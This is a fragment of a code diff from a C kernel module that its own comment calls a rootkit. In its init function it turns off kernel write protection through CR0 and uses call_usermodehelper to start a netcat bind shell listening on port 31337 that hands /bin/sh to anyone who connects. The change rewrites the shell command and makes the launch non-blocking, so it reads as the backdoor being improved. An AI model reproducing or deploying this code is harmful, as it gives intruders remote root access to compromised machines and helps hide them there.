@@ -225,13 +225,13 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
-	char *argv[] = { "/bin/sh", "-c", "/bin/nc -lp 31337 -e /bin/sh &", "NULL"};
+	char *argv[] = { "/bin/nc", "-lp", "31337", "-e", "/bin/sh", "NULL"};
         static char *env[] = {
         "HOME=/",
         "TERM=linux",
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-        call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+        call_usermodehelper(argv[0], argv, env, UMH_NO_WAIT);
 	
 	return 0;
 }
